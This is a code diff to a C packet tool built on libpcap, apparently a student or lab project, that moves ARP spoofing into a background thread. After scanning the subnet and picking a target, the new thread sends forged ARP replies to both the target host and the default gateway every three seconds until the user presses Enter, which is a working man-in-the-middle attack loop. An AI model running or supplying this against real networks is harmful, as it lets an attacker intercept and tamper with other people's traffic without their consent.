@@ -1,6 +1,7 @@
 #include <pcap.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <pthread.h>
 
 #include "arp.h"
 #include "dns.h"
@@ -11,6 +12,10 @@
 
 extern char *defdnsquery;
 extern uint16_t tcp_filter_port;
+extern uint8_t *myroutereth;
+extern uint8_t *targetip;
+extern uint8_t *targeteth;
+extern uint8_t start_attack;
 
 void rcvd_raw_tcp(myip_hdr_t *ip_hdr, mytcp_hdr_t *tcp_hdr, uint8_t *data,
                   int len) {
@@ -94,15 +99,23 @@ int main_proc(netdevice_t *p) {
   return 0;
 }
 
+void *start_spoofing(netdevice_t *p) {
+  while (start_attack) {
+    // 騙目標主機
+    arp_spoof(p, targeteth, targetip, myrouterip);
+    // 騙預設閘道器
+    arp_spoof(p, myroutereth, myrouterip, targetip);
+    sleep(3);
+  }
+  pthread_exit(NULL);
+}
+
 int main_proc3(netdevice_t *p) {
   char buf[MAX_LINEBUF];
   ipaddr_t ip;
   int key;
 
   ipethaddr_t *target;
-  extern uint8_t *myroutereth;
-  extern uint8_t *targetip;
-  extern uint8_t *targeteth;
 
   // 利用 ARP request 掃描子網
   arp_scan(p);
@@ -134,6 +147,7 @@ int main_proc3(netdevice_t *p) {
       targetip = &(target->ip);
       targeteth = target->eth;
       myroutereth = arptable_existed(defarpip);
+      start_attack = 0x01;
       break;
     }
 
@@ -141,6 +155,9 @@ int main_proc3(netdevice_t *p) {
       break;
     }
   }
+
+  pthread_t t;
+  pthread_create(&t, NULL, start_spoofing, p);
 
   int cnt = 0;
   while (1) {
@@ -151,12 +168,12 @@ int main_proc3(netdevice_t *p) {
       break;
     }
 
-    if (cnt % 1000000 == 0) {
-      // 騙目標主機
-      arp_spoof(p, targeteth, targetip, myrouterip);
-      // 騙預設閘道器
-      arp_spoof(p, myroutereth, myrouterip, targetip);
-    }
+    // if (cnt % 1000000 == 0) {
+    //   // 騙目標主機
+    //   arp_spoof(p, targeteth, targetip, myrouterip);
+    //   // 騙預設閘道器
+    //   arp_spoof(p, myroutereth, myrouterip, targetip);
+    // }
     cnt++;
 
     /*
@@ -169,6 +186,7 @@ int main_proc3(netdevice_t *p) {
      * If user pressed enter, exit the program
      */
     if ((key = fgetc(stdin)) == '\n') {
+      start_attack = 0x00;
       break;
     }
     ungetc(key, stdin);
@@ -177,6 +195,7 @@ int main_proc3(netdevice_t *p) {
       break;
     }
   }
+  pthread_join(t, NULL);
 }
 
 void arp_scan(netdevice_t *p) {
